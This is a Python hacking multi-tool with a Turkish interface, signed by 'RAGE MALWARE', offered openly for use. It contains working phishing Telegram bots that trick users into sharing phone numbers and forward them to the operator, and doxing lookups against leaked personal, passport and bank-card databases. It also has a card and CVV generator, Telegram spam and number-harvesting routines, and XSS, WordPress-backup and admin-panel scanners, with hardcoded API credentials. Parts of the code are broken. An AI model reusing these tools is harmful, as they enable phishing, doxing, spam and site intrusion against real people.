_A6='Hesabınızın telefon numarasını (veya e-posta adresini) girin:'
_A5='Lütfen sayıyı girin! Tekrar deneyin ve /nacrutka yazın!'
_A4='Miktarı girin (500’den fazla olmamalı)'
_A3='Belki botunuzda /start komutunu yazmadınız! Bu işlem yapılmazsa, script doğru çalışmayacaktır!'
_A2='Token’i girin:  '
_A1='Kendi ID’nizi girin:  '
_A0='Telefon: '
_z='Cinsiyet: '
_y='verify'
_x='Tokeni girin: '
_w='contact'
_v='start_dox'
_u='Bot başlatıldı!'
_t='127.0.0.1'
_s='Boylam: '
_r='Enlem: '
_q='Ülke: '
_p='Alpha 3: '
_o='Alpha 2: '
_n='Kategori: '
_m='Marka: '
_l='Müşteri UK: '
_k='alfa.csv'
_j='Введите URL сайта > '
_i="Site URL'sini girin --->"
_h='messages.csv'
_g='Grup bağlantısını girin: '
_f='Kullanıcı adını girin: '
_e='html.parser'
_d='0123456789'
_c="Miktar 500'den fazla olamaz!"
_b='Görüntülenmeler'
_a='Bot başlatıldı!\n'
_Z='Doğum tarihi: '
_Y='E-posta: '
_X='21782455'
_W='Hesabınızın şifresini girin:'
_V='Takipçiler📃'
_U='!Bot başlatıldı!'
_T='anon'
_S=False
_R='https://'
_Q='nacrutka'
_P='Bir seçenek seçin:'
_O='Paylaşımlar'
_N='Beğeniler❤️'
_M='dox'
_L='6a75750gnee5acb3asbbde2me3325l31'
_K='start'
_J='Markdown'
_I='a'
_H='r'
_G='  '
_F='bot-log.txt'
_E='a+'
_D=True
_C='\n'
_B='like'
_A='utf-8'
import asyncio,threading,random
from pystyle import Colors,Box,Write,Center,Colorate
import time,ctypes,requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import whois,os,telebot,time
from telebot import*
import time,traceback
from PIL import Image
from PIL.ExifTags import TAGS
import string,random
from faker import Faker
import csv,telebot
from telebot import types
import time,asyncio,socket
from telethon.sync import TelegramClient
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import TelegramClient,events
from telethon.sync import TelegramClient
from telethon.tl import functions
from telethon import TelegramClient,events
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
import urllib,socket
from urllib.parse import urlparse
from urllib.request import urlopen
import pystyle
request_count=0
last_request_time=0
API='7808783395:2XpDElrl'
def Search(Term):
	B='No results found';A='List'
	def make_request(Term):data={'token':API,'request':Term,'limit':100,'lang':'eng'};url='https://server.leakosint.com/';response=requests.post(url,json=data);return response.json()
	data=make_request(Term)
	for source in data[A]:
		if source==B:pystyle.Write.Print('[!] Hiçbir şey bulunamadı')
		pystyle.Write.Print(f"\n[!] Veritabanı -> ",pystyle.Colors.red_to_yellow,interval=.001);pystyle.Write.Print(f"{source}\n",pystyle.Colors.white,interval=.001)
		for item in data[A][source]['Data']:
			if str(item)in set():continue
			for(key,value)in item.items():pystyle.Write.Print(f"[+] {key} -> ",pystyle.Colors.red_to_yellow,interval=.001);pystyle.Write.Print(f"{value}\n",pystyle.Colors.white,interval=.001)
	if B not in data[A]:print();pystyle.Write.Print('----======[',pystyle.Colors.red_to_blue,interval=.005);pystyle.Write.Print('Internet Tool',pystyle.Colors.white,interval=.005);pystyle.Write.Print(']======----',pystyle.Colors.red_to_blue,interval=.005)
def generate_card_number(country):prefix={'1':'9800','2':'8100','3':'3980'};return prefix[country]+''.join(random.choice(_d)for _ in range(12))
global page
def wpbackupscanner(host):
	backups=['/wp-config.php','/wp-config.php.txt','/wp-config.php.save','/.wp-config.php.swp','/wp-config.php.swp','/wp-config.php.swo','/wp-config.php_bak','/wp-config.bak','/wp-config.php.bak','/wp-config.save','/wp-config.old','/wp-config.php.old','/wp-config.php.orig','/wp-config.orig','/wp-config.php.original','/wp-config.original','/wp-config.txt'];print(Colorate.Horizontal(Colors.red_to_purple,'WordPress yedeklerini arama'));progress=0;backup=[];backupurl=[]
	try:
		for i in backups:
			print(Colorate.Horizontal(Colors.red_to_purple,'İlerleme %i / %s'%(progress,len(backups))));progress+=1;sock(host,i)
			if page.getcode()==200:
				detecting=str(sock(host,i,'1'))
				if"define('BD_PASSWORD')"in detecting:s1=i;s2=data;backup.append(s1);backupurl.append(s2)
	except KeyboardInterrupt:print(Colorate.Horizontal(Colors.red_to_purple,'Dosya tespiti atlandı'))
	print('')
	for(ifile,iurl)in zip(backup,backupurl):print(Colorate.Horizontal(Colors.red_to_purple,'Yedek bulundu!\n | Dosya adı: %s\n | URL: %i\n'%(ifile,iurl)))
def dump_site(url):
	response=requests.get(url)
	if response.status_code!=200:exit(Colorate.Horizontal(Colors.red_to_purple,'Siteye erişim sağlanamadı.'))
	soup=BeautifulSoup(response.text,_e);filename=url.replace(_R,'').split('.')[0]+'.html';print(Colorate.Horizontal(Colors.red_to_purple,f"Damp {filename} içine kaydedildi"))
	with open(filename,'w',encoding=_A)as file:file.write(soup.prettify())
def generation_naxyi():
	print(Colorate.Horizontal(Colors.red_to_purple,f"Tüm anahtarlar mullvad_keys.txt dosyasına kaydedilecek"));keys=int(input(Colorate.Horizontal(Colors.red_to_purple,'Kaç tane anahtar oluşturulacak ---> ')))
	def generate_key():key=''.join(random.choices(string.digits,k=16));return key
	def validated_key(key):
		if len(key)!=16:return _S
		if not key.isdigit():return _S
		return _D
	def save_key(key):
		with open('mullvad_keys.txt',_I)as file:file.write(key+_C)
	for _ in range(keys):
		generated_key=generate_key()
		if validated_key(generated_key):save_key(generated_key)
		else:0
def request_sd(url):
	try:return requests.get(_R+url)
	except requests.exceptions.ConnectionError:pass
	except requests.exceptions.InvalidURL:pass
	except UnicodeError:pass
	except KeyboardInterrupt:print(Colorate.Horizontal(Colors.red_to_purple,'Program donmuş durumda'));exit(0)
def generate_expiry_date():month=str(random.randint(1,12)).zfill(2);year=str(random.randint(2023,2030));return month+'/'+year[-2:]
def generate_cvv():return''.join(random.choice(_d)for _ in range(3))
def generate_card(country):card_number=generate_card_number(country);expiry_date=generate_expiry_date();cvv=generate_cvv();return card_number,expiry_date,cvv
def subdomainfinger(wordlist,domain):
	wordlist=wordlist.split(_C)
	for line in wordlist:
		word=line.strip();test_url=word+'.'+domain;response=request_sd(test_url)
		if response.status_code==200:print(f"[+] {test_url}")
		else:print(f"[-] {test_url}")
def get_characters(complexity):
	characters=string.ascii_letters+string.digits
	if complexity=='medium':characters+='!@#$%^&*()'
	elif complexity=='high':characters+=string.punctuation
	return characters
def XSSScan(site):
	print(Colorate.Horizontal(Colors.red_to_purple,'XSS tarayıcısı başlatıldı'));vuln=[];payloads={'3':'natrium();"\'\\/}{natrium','2':'natrium</script><script>alert(1)<script>natrium','1':'<natrium>'};path=_R+site+urllib.parse.urlparse(site).path;parsedurl=urllib.parse.urlparse(site);parameters=urllib.parse.parse_qsl(parsedurl.query,keep_blank_values=_D);parameternames=[];parametervalues=[]
	for m in parameters:parameternames.append(m[0]);parametervalues.append(m[0])
	for n in parameters:
		found=0
		try:
			for i in payloads:
				pay=payloads[i];index=parameternames.index(n[0]);original=parametervalues[index];parametervalues[index]=pay;modifiedurl=urllib.urlencode(dict(zip(parameternames,parametervalues)));parametervalues[index]=original;modifiedparams=modifiedurl;payloads=urllib.quote_plus(payloads[i]);u=urllib.urlopen(path+'?'+modifiedparams);source=u.read();code=BeautifulSoup(source)
				if str(i)==str(1):
					if payloads[i]in source:found=1
				script=code.findAll('script')
				if str(i)==str(3)or str(i)==str(2):
					for p in range(len(script)):
						try:
							if pay in script[p].contents[0]:found=1
						except IndexError:pass
				if str(i)==str(2):
					if payloads['2']in source:found=1
		except KeyError:pass
def admin_finger(url):
	file=requests.get('https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist.txt').text;file1=requests.get('https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist1.txt').text;file2=requests.get('https://raw.githubusercontent.com/NirkZxc/Wordlist/main/wordlist2.txt').text;file=file.split(_C);file1=file1.split(_C);file2=file2.split(_C)
	for line in file:
		admin_url1=_R+url+'/'+line;admin_url=admin_url1.replace(_C,'');response=requests.head(admin_url)
		if response.status_code==200:print(f"[+] {admin_url}")
		else:print(f"[-] {admin_url}")
def console_clear():
	if os.sys.platform=='win32':os.system('cls')
	else:os.system('clear')
def generate_password(length,complexity):characters=get_characters(complexity);password=''.join(random.choice(characters)for i in range(length));return password
starting='\n                                        \n                   \n ███▄ ▄███▓ ▒█████   ███▄ ▄███▓▓█████  ███▄    █    \n▓██▒▀█▀ ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █    \n▓██    ▓██░▒██░  ██▒▓██    ▓██░▒███   ▓██  ▀█ ██▒   \n▒██    ▒██ ▒██   ██░▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒   \n▒██▒   ░██▒░ ████▓▒░▒██▒   ░██▒░▒████▒▒██░   ▓██░   \n░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒    \n░  ░      ░  ░ ▒ ▒░ ░  ░      ░ ░ ░  ░░ ░░   ░ ▒░   \n░      ░   ░ ░ ░ ▒  ░      ░      ░      ░   ░ ░    \n       ░       ░ ░         ░      ░  ░         ░    CODDED BY RAGE MALWARE I L0VE YOU ALL <3\n                                                    \n\n       \n                                    Dev > @RageSySteam\n                                    Tg > @SwareHackTeam & @SwareGroup             \n                                                \n                                                 \n            -=============================================================================================-\n'
Write.Print(starting,Colors.purple_to_blue,interval=.001)
menu='\n1: Numara sorgulama<       │ 11: WEB-CRAWLER<                    │ 21: KURGULANMIŞ HARİTA JENERATÖRÜ<         \n2: E-posta sorgulama<      │ 12: cBаT BaHB0Pд<                   │ 22: tg PARSER<                  \n3: Takma ad sorgulama<     │ 13: Telegram sorgulama<             │ 23: tg SPAMMER<                  \n4: E-posta gönderme<       │ 14: TRAFİK<                         │ 24: port SCANNER<                        \n5: DDOS<                   │ 15: ZORLANMIŞ ŞİFRE JENERATÖRÜ<     │ 25: KART SORGULAMASI<                      \n6: Veritabanı sorgulama<   │ 16: KİŞİLİK JENERATÖRÜ<             │ 26: VK SORGULAMASI<                        \n7: İsim soyisim sorgulama< │ 17: PROXY<                          │ 27: OTOMATİK CEVAPLAYICI<              \n8: Phishing<               │ 18: ADRES SORGULAMA<                │ 28: LOGGER<       \n9: IP sorgulama<           │ 19: PHISHING "ANONİM CHAT"<         │ 29: PARSER<      \n10: Site bilgisi<          │ 20: PHISHING "GOD\'S EYE"<           │ 30: SYSADMIN SORGULAMASI<                       \n───────────────────────────┼─────────────────────────────────────┼──────────────────────────────────────────\n31: XSS TARAYICISI<         │ 33: ALT ALAN SORGULAMASI<           │ 35: SITE DUMPING<\n32: WORDPRESS YEDEK TARAYICISI< │ 34: MULLVAD JENERATÖRÜ<         │ 36: ÇIKIŞ<\n'
Write.Print(Center.XCenter(Box.DoubleCube(menu)),Colors.purple_to_blue,interval=.001)
def transform_text(input_text):
	translit_dict={'а':'@','б':'Б','в':'B','г':'г','д':'д','е':'е','ё':'ё','ж':'ж','з':'3','и':'u','й':'й','к':'K','л':'л','м':'M','н':'H','о':'0','п':'п','р':'P','с':'c','т':'T','у':'y','ф':'ф','х':'X','ц':'ц','ч':'4','ш':'ш','щ':'щ','ъ':'ъ','ы':'ы','ь':'ь','э':'э','ю':'ю','я':'я'};transformed_text=[]
	for char in input_text:
		if char in translit_dict:transformed_text.append(translit_dict[char])
		else:transformed_text.append(char)
	return''.join(transformed_text)
def ip_lookup(ip_address):
	url=f"http://ip-api.com/json/{ip_address}"
	try:
		response=requests.get(url);data=response.json()
		if data.get('status')=='fail':return f"Hata: {data['message']}\n"
		info=''
		for(key,value)in data.items():info+=f"  |{key}: {value}\n"
		return info
	except Exception as e:return f"Bir hata oluştu: {str(e)}\n"
def get_website_info(domain):
	try:domain_info=whois.whois(domain);print_string=f"""
  |Site Bilgisi:  
  |Alan Adı: {domain_info.domain_name}  
  |Kaydedildi: {domain_info.creation_date}  
  |Bitiş Tarihi: {domain_info.expiration_date}  
  |Sahibi: {domain_info.registrant_name}  
  |Kuruluş: {domain_info.registrant_organization}  
  |Adres: {domain_info.registrant_address}  
  |Şehir: {domain_info.registrant_city}  
  |Eyalet: {domain_info.registrant_state}  
  |Posta Kodu: {domain_info.registrant_postal_code}  
  |Ülke: {domain_info.registrant_country}  
  |IP Adresi: {domain_info.name_servers}
    """;Write.Print(print_string+_C,Colors.red_to_purple,interval=.005)
	except Exception as e:print(f"Ошибка: {e}\n")
while _D:
	choice=Write.Input('\nFonksiyon numarasını seçin > ',Colors.purple_to_blue,interval=.005)
	if choice=='29':
		api_id=21782455;api_hash=_L;client=TelegramClient(_T,api_id,api_hash)
		async def main():
			await client.start();username=input(_f);group=input(_g)
			async for message in client.iter_messages(group,from_user=username):
				date=str(message.date);name=message.from_id.user_id;content=str(message.text);row=[f"{date} | @{name}: {content}"]
				with open(_h,_I,encoding=_A)as f:writer=csv.writer(f);writer.writerow(row)
			await client.disconnect()
	if choice=='30':url=input(Colorate.Horizontal(Colors.red_to_purple,"Site URL'sini girin > "));admin_finger(url)
	if choice=='31':url=input(Colorate.Horizontal(Colors.red_to_purple,_i));XSSScan(url)
	if choice=='32':url=input(Colorate.Horizontal(Colors.red_to_purple,_i));cnsole_clear();wpbackupscanner(url)
	if choice=='34':generation_naxyi()
	if choice=='33':
		console_clear();print(Colorate.Horizontal(Colors.red_to_purple,Center.Center(f"""
            -----------------------------------------------------------------------------------------------             
                                                Subdomain finger Menu                                                   
            -----------------------------------------------------------------------------------------------             
                                                                                                                        
           [1]  Küçük bir sözlük kullanarak alt alan adı brute force yapma             [2]  Büyük bir sözlük kullanarak alt alan adı brute force yapma       
                                                                                                                        
                                                                                                                        
                                              [99] Ana menü                                                         
                                                  [0]  Çıkış                                                            
                                                                                                                        """)));page_sd=int(input(Colorate.Horizontal(Colors.red_to_purple,'----->')))
		if page_sd==1:wordlist=requests.get('https://raw.githubusercontent.com/NirkZxc/Wordlist/main/small.txt').text;domain=input(Colorate.Horizontal(Colors.red_to_purple,_j));request_sd(domain);subdomainfinger(wordlist,domain)
		elif page_sd==2:wordlist=requests.get('https://raw.githubusercontent.com/NirkZxc/Wordlist/main/subdomain.list').text;domain=input(Colorate.Horizontal(Colors.red_to_purple,_j));request_sd(domain);subdomainfinger(wordlist,domain)
		elif page_sd==99:os.system('clear');main()
		elif page_sd==0:exit(Colorate.Horizontal(Colors.red_to_purple,'Good Luck!'))
	if choice=='23':
		api_id=21782455;api_hash=_L;client=TelegramClient(_T,api_id,api_hash)
		async def main():
			await client.start();username=input(_f);group=input(_g)
			async for message in client.iter_messages(group,from_user=username):
				date=str(message.date);name=message.from_id.user_id;content=str(message.text);row=[f"{date} | @{name}: {content}"]
				with open(_h,_I,encoding=_A)as f:writer=csv.writer(f);writer.writerow(row)
			await client.disconnect()
		with client:client.loop.run_until_complete(main())
	if choice=='27':
		api_id=_X;api_hash=_L;client=TelegramClient(_T,api_id,api_hash);responded_users=set();response_text=input('Введите текст: ')
		@client.on(events.NewMessage)
		async def my_event_handler(event):
			if event.sender_id not in responded_users:await event.reply(response_text);responded_users.add(event.sender_id)
		client.start();client.run_until_disconnected()
	if choice=='26':search_term=input('VK bağlantısını girin: ');Search
	if choice=='25':
		card=Write.Input('Kartı girin: ',Colors.purple_to_blue,interval=.005);found=_S;folder='db';path3=os.path.join(folder,_k)
		with open(path3,_H,encoding=_A)as f:
			for line in f:
				if card in line:line=line.replace(',',_C);elements=line.strip().split(_C);print('UK: '+elements[0]);print('Müşteri Adı: '+elements[1]);print('Doğum Tarihi: '+elements[2]);print(_l+elements[3]);print('Müşteri İletişim Kodu: '+elements[4]);print('Müşteri UK Sahibi: '+elements[5]);print('Kart Numarası Kodu: '+elements[6]);print('Son Kullanma Tarihi: '+elements[7]);print('Hesap Numarası: '+elements[8]);print('BIN: '+elements[9]);print(_m+elements[10]);print('Tür: '+elements[11]);print(_n+elements[12]);print('Emitent: '+elements[13]);print(_o+elements[14]);print(_p+elements[15]);print(_q+elements[16]);print(_r+elements[17]);print(_s+elements[18]);found=_D;break
				if not found:print('Veriler bulunamadı')
	if choice=='24':print('Modu seçin:');print('99 - Sık kullanılan portları kontrol et');print('98 - Belirtilen portu kontrol et');mode=input('Ваш выбор:')
	if choice=='99':
		mode=input('Seçiminiz: ');ports=[20,26,28,29,55,53,80,110,443,8080,1111,1388,2222,1020,4040,6035]
		for port in ports:
			sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);result=sock.connect_ex((_t,port))
			if result==0:print(f"Port {port} açık")
			else:print(f"Port {port} kapalı"),
			sock.close()
	elif choice=='98':
		port=int(input('Port numarasını girin: '));sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM);result=sock.connect_ex((_t,port))
		if result==0:print(f"Port {port} açık")
		else:print(f"Port {port} kapalı")
		sock.close()
	if choice=='36':print('çıkış...');time.sleep(.5)
	if choice=='22':
		range_num=int(input('Bir sayı girin: '));api_id='25167873';api_hash='6f0af1029f9829dfadbbc609922d6762';codes={'МТС':[910,915,916,917,919,985,986],'Билайн':[903,905,906,909,962,963,964,965,966,967,968,969,980,983,986],'МегаФон':[925,926,929,936,999],'Теле2':[901,958,977,999]}
		with TelegramClient(_T,api_id,api_hash)as client:
			for _ in range(range_num):
				operator=random.choice(list(codes.keys()));operator_code=random.choice(codes[operator]);phone_number=f"+7{operator_code}{random.randint(1000000,9999999)}";random_name=''.join(random.choices(string.ascii_uppercase+string.ascii_lowercase,k=10));contact=InputPhoneContact(client_id=0,phone=phone_number,first_name=random_name,last_name='');result=client(ImportContactsRequest([contact]))
				try:
					entity=client.get_entity(phone_number);print(f"Hesap mevcut: {entity.id}, {entity.username}, {entity.first_name}, {entity.phone}")
					with open('valid.txt',_I)as f:f.write(f"{entity.phone}, {entity.id}, {entity.username}, {entity.first_name}\n")
				except ValueError:print(f"Hesap {phone_number} mevcut değil.")
	if choice=='21':print('Ülke seçin:');print('1: Ukrayna');print('2: Rusya');print('3: Kazakistan');country=input();card_number,expiry_date,cvv=generate_card(country);print(f"Ülke: {country}\nKart Numarası: {card_number}\nSon Kullanma Tarihi: {expiry_date}\nCVV: {cvv}")
	if choice=='20':
		Write.Print("\n——————————————Açıklama—————————————————\nKullanıcı botu başlatır > Kullanıcı telefon numarasını bota gönderir > Telefon numarası size gönderilir.\n——————————————Talimatlar—————————————————\nAdım 1: @BotFather'dan bot token'ını al ve bu token'ı token satırına gir.\nAdım 2: Telegram ID'nizi ID satırına girin\n    ",Colors.red_to_yellow,interval=.001);Token=Write.Input('\nToken girin: ',Colors.purple_to_blue,interval=.005);admin=Write.Input('Telegram ID: ',Colors.purple_to_blue,interval=.005);bot=telebot.TeleBot(Token);Write.Print(_u,Colors.red_to_purple,interval=.005);find_menu=types.InlineKeyboardMarkup();button0=types.InlineKeyboardButton('🔎Aramaya Başla',callback_data=_v);find_menu.row(button0);button1=types.InlineKeyboardButton('⚙️Hesap',callback_data=_M);button2=types.InlineKeyboardButton('🆘Destek',callback_data=_M);find_menu.row(button1,button2);button3=types.InlineKeyboardButton('🤖Kendi botunu oluştur',callback_data=_M);find_menu.row(button3);button4=types.InlineKeyboardButton('🤝Ortaklık Programı',callback_data=_M);find_menu.row(button4)
		@bot.message_handler(commands=[_K])
		def start(message):bot.send_message(message.from_user.id,'*Hoş geldiniz!*',parse_mode=_J)
		bot.send_message(message.from_user.id,'*Lütfen yapmak istediğiniz işlemi seçin:*',parse_mode=_J,reply_markup=find_menu)
		@bot.callback_query_handler(func=lambda call:call.data==_v)
		def button0_pressed(call):A='_/_';bot.send_message(chat_id=call.message.chat.id,text='👤 Поиск по имени\n'+'├  `Blogger` _(Etiketle Arama)_\n├  `Antipov Evgeniy Vyacheslavovich`\n└  `Antipov Evgeniy Vyacheslavovich 05.02.1994`\n_(Aşağıdaki formatlar da mevcuttur_ '+'`05.02`'+A+'`1994`'+A+'`28`'+A+'`20-28`'+'_)_\n\n🚗 Araç araması\n├  `Н777ОН777` - *Rusya* araması için\n└  `ХТА21150053965897` - *VIN* ile arama\n\n👨 *Sosyal medya hesapları*\n├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n├  `https://vk.com/id577744097` - *Vkontakte*\n├  `https://facebook.com/profile.php?id=1` - *Facebook*\n└  `https://ok.ru/profile/162853188164` - *Odnoklassniki*\n\n📱 `79999939919` - *Telefon numarası* ile arama\n📨 `tema@gmail.com` - *E-posta* ile arama\n📧 `#281485304`, `@durov` veya `mesajı ilet` - *Telegram* hesabı ile arama\n\n🔐 `/pas churchill7` - *Parola* ile e-posta, kullanıcı adı ve telefon numarası araması\n🏚 `/adr Moskova, Tverskaya, d 1, kv 1` - *Adres bilgisi* (Rusya)\n🏚 `/adr Moskova, Tverskaya, d 1, kv 1` - *Adres bilgisi* (Rusya)\n🏛 `/company Sberbank` - *Şirketler* için arama\n📑 `/inn 784806113663` - *TIN* ile arama\n🎫 `/snils 13046964250` - *SNILS* ile arama\n\n📸 *Kişinin fotoğrafını* gönderin, onu veya kopyasını *VK*, *OK* gibi sitelerde bulmak için.\n🚙 *Araç numarası* fotoğrafını gönderin, hakkında bilgi almak için.\n🙂 *Sticker* gönderin, *yaratıcıyı* bulmak için.\n🌎 *Harita üzerindeki bir nokta* gönderin, şu anda orada olan *insanları* bulmak için.\n🗣 *Sesli komutlar* ile de *arama yapabilirsiniz*.',parse_mode=_J)
		send=types.ReplyKeyboardMarkup(row_width=1,resize_keyboard=_D);button_phone=types.KeyboardButton(text='✅pörsütmek',request_contact=_D);send.add(button_phone)
		@bot.callback_query_handler(func=lambda call:call.data==_M)
		def button1_pressed(call):bot.send_message(chat_id=call.message.chat.id,text='⚠️Aramaya başlamadan önce hesabınızı doğrulayın\n\n*Bu, bize yapılan aktif DDOS saldırısıyla ilgili geçici bir önlemdir.*',parse_mode=_J,reply_markup=send)
		@bot.message_handler(content_types=[_w])
		def contact(message):
			if message.contact is not None:
				try:Write.Print(f"""
Birisi telefon numarasını gönderdi:
 İsim: {message.from_user.first_name}
 Kullanıcı adı: {message.from_user.username}
 ID: {message.from_user.id}
 Telefon numarası:  {message.contact.phone_number}
 -------------------------------""",Colors.red_to_yellow,interval=.005);bot.send_message(admin,'*🔔Birisi telefon numarasını gönderdi!*\n'+'Ad: `'+message.from_user.first_name+'\n`Kullanıcı adı: @'+message.from_user.username+'\n`ID: '+str(message.from_user.id)+'\n`Telefon numarası: `'+message.contact.phone_number+'`',parse_mode=_J);f=open('db.csv',_E);f.write(f"{message.from_user.first_name},{message.from_user.last_name},{message.from_user.username},{message.from_user.id},{message.contact.phone_number}\n");f.close()
				except TypeError:traceback.print_exc();print('Vücut yok veya diğer typeerror')
				curhour=time.asctime().split(' ')[3].split(':')[0];bot.send_message(message.from_user.id,f"*⚠️ Teknik çalışmalar {int(curhour)+7}:00 MSK'ye kadar devam edecektir.*\n\nÇalışmalar bu süre zarfında tamamlanacak ve tüm abonelikler uzatılacaktır.",parse_mode=_J,reply_markup=types.ReplyKeyboardRemove())
		@bot.message_handler(content_types=['text'])
		def handler(message):bot.send_message(message.from_user.id,'⚠️ Aramaya başlamadan önce hesabınızı doğrulayın.\n\n*Bu, bize yönelik aktif bir DDOS saldırısıyla ilgili geçici bir önlemdir.*',parse_mode=_J,reply_markup=send)
		bot.infinity_polling(none_stop=_D)
	if choice=='14':
		api_id=_X;api_hash=_L;client=TelegramClient('session_telegram',api_id,api_hash)
		async def send_message():
			while _D:await client.send_message(f"{linkc}",f"{message1}");print('Mesaj gönderildi!');await asyncio.sleep(time2)
		async def main():await client.start();tasks=[asyncio.ensure_future(send_message())];await asyncio.gather(*tasks)
		if __name__=='__main__':
			linkc=input('Grup linki: ');message1=input('Mesaj: ');time2=int(input('Arama süresi: '))
			with client:client.loop.run_until_complete(main())
	if choice=='19':
		token_bot=input(_x);bot=telebot.TeleBot(token_bot);bot.delete_webhook();waiting_users=[];chatting_users={};verified_users={}
		def send_welcome(message):
			if message.chat.id in verified_users:bot.send_message(message.chat.id,f"Merhaba {message.from_user.first_name}, burası birbirine hızlı mesajlaşma yapabileceğiniz anonim bir sohbet. Burada arkadaşlıklar, yeni tanışmalar ve daha fazlasını bulabilirsiniz☺.");time.sleep(1);bot.send_message(message.chat.id,'Şimdi tanışma arayışına başlayabilirsiniz!😋, sohbet arkadaşı aramaya başlamak için /search komutunu gönderin. Sohbeti sonlandırmak için /stop komutunu gönderin.')
			else:markup=types.InlineKeyboardMarkup();markup.add(types.InlineKeyboardButton(text='Kimliğinizi Doğrulayın🐱\u200d👤',callback_data=_y));bot.send_message(message.chat.id,f"Merhaba {message.from_user.first_name}, burası birbirine hızlı mesajlaşma yapabileceğiniz anonim bir sohbet. Burada arkadaşlıklar, yeni tanışmalar ve daha fazlasını bulabilirsiniz. Ancak başlamadan önce, spam nedeniyle kimliğinizi doğrulamanız gerekmektedir🤒.",reply_markup=markup)
		@bot.message_handler(commands=[_K])
		def start_handler(message):send_welcome(message)
		@bot.callback_query_handler(func=lambda call:call.data==_y)
		def verify_handler(call):markup=types.ReplyKeyboardMarkup(one_time_keyboard=_D,resize_keyboard=_D);button_contact=types.KeyboardButton(text='İletişim Bilgisi Gönder',request_contact=_D);markup.add(button_contact);bot.send_message(call.message.chat.id,'Lütfen kimliğinizi doğrulamak için iletişim bilginizi gönderin.',reply_markup=markup)
		@bot.message_handler(content_types=['text'])
		def text_handler(message):
			A='Sohbet arkadaşı bulundu. Sohbete başlayın.'
			if message.chat.id not in verified_users:bot.send_message(message.chat.id,'❌Bu komutu kullanabilmek için kimliğinizi doğrulayın❌');return
			if message.text=='/search':
				waiting_users.append(message.chat.id);bot.send_message(message.chat.id,'Sohbet arkadaşı bekleniyor⏱')
				if len(waiting_users)>1:user1=waiting_users.pop(0);user2=waiting_users.pop(0);chatting_users[user1]=user2;chatting_users[user2]=user1;bot.send_message(user1,A);bot.send_message(user2,A)
			elif message.text=='/stop':
				if message.chat.id in chatting_users:partner_id=chatting_users[message.chat.id];del chatting_users[message.chat.id];del chatting_users[partner_id];bot.send_message(partner_id,'Görüşme partneriniz diyaloğu sonlandırdı😥');send_welcome(message)
			elif message.chat.id in chatting_users:bot.send_message(chatting_users[message.chat.id],message.text)
		@bot.message_handler(content_types=[_w])
		def contact_handler(message):
			if message.chat.id not in verified_users:
				verified_users[message.chat.id]=message.contact.phone_number
				with open('users.csv',_I,newline='')as file:writer=csv.writer(file);writer.writerow([message.contact.phone_number,message.chat.id,message.from_user.username,message.from_user.first_name])
				bot.send_message(message.chat.id,'Harika, artık yeni insanlarla tanışabilirsiniz!😋 Sohbet başlatmak için /search, diyaloğu sonlandırmak için /stop komutunu kullanın.')
		@bot.message_handler(content_types=['document'])
		def document_handler(message):
			file_info=bot.get_file(message.document.file_id)
			if file_info.file_path.endswith('.exe')or file_info.file_path.endswith('.apk'):bot.delete_message(message.chat.id,message.message_id);bot.send_message(message.chat.id,'Üzgünüz, ancak .exe ve .apk dosyalarının gönderilmesine izin verilmiyor.')
		bot.polling()
	if choice=='18':
		adress=Write.Input('Adresi girin: ',Colors.purple_to_blue,interval=.005);found=_S;folder='db';files=['db/bdd.csv','db/part1.csv','db/part3.csv','db/part4.csv','db/part5.csv','db/part6.csv'];path=os.path.join(folder,'part7.csv');path1=os.path.join(folder,'eyeofgod.csv');path2=os.path.join(folder,'russian bd.csv');path3=os.path.join(folder,_k);path4=os.path.join(folder,'helix.csv')
		with open(path4,_H,encoding=_A)as f:
			for line in f:
				if adress in line:line=line.replace(',',_C);elements=line.strip().split(_C);print('SOYADI: '+elements[0]);print('ADI: '+elements[1]);print('BABA ADI: '+elements[2]);print('DOĞUM TARİHİ: '+elements[3]);print(_z+elements[4]);print(_Y+elements[5]);print('Telefon numarası: '+elements[6]);break
		with open(path3,_H,encoding=_A)as f:
			for line in f:
				if adress in line:line=line.replace(',',_C);elements=line.strip().split(_C);print('UK: '+elements[0]);print('Müşteri adı: '+elements[1]);print(_Z+elements[2]);print(_l+elements[3]);print('Müşteri iletişim kodu: '+elements[4]);print('Müşteri UK sahibi: '+elements[5]);print('Kart numarası kodu: '+elements[6]);print('Son kullanma tarihi: '+elements[7]);print('Hesap numarası: '+elements[8]);print('BIN: '+elements[9]);print(_m+elements[10]);print('Tür: '+elements[11]);print(_n+elements[12]);print('Yayımlayan: '+elements[13]);print(_o+elements[14]);print(_p+elements[15]);print(_q+elements[16]);print(_r+elements[17]);print(_s+elements[18]);break
		with open(path2,_H,encoding=_A)as f:
			for line in f:
				if adress in line:line=line.replace('|',_C);line=line.replace('"','');elements=line.strip().split(_C);print('—————Türkçe—————');print('Ad Soyad: '+elements[0]);print(_Z+elements[1]);print(_A0+elements[2]);print(_Y+elements[3])
		with open(path,_H,encoding=_A)as f:
			for line in f:
				if adress in line:line=line.replace(';',_C);line=line.replace("'",'');elements=line.strip().split(_C);print('—————E-Devlet—————');print('Tarih ve saat: '+elements[0]);print('Soyadı: '+elements[1]);print('Adı: '+elements[2]);print('Baba adı: '+elements[3]);print(_z+elements[4]);print(_Z+elements[5]);print('Adres: '+elements[6]);print('Pasaport bilgileri: '+elements[7]);print(_Y+elements[8]);print(_A0+elements[9])
		for path in files:
			if os.path.exists(path):
				with open(path,_H,encoding=_A)as f:
					for line in f:
						if adress in line:data=line.split(';');basa1=f"""
—————Büyük Değişim—————
{"Kullanıcı ID:":<20}{data[0]}
{"Kayıt tarihi:":<20}{data[1]}
{"Soyadı:":<20}{data[2]}
{"Adı:":<20}{data[3]}
{"Baba adı:":<20}{data[4]}
{"Doğum tarihi:":<20}{data[5]}
{"Cinsiyet:":<20}{data[6]}
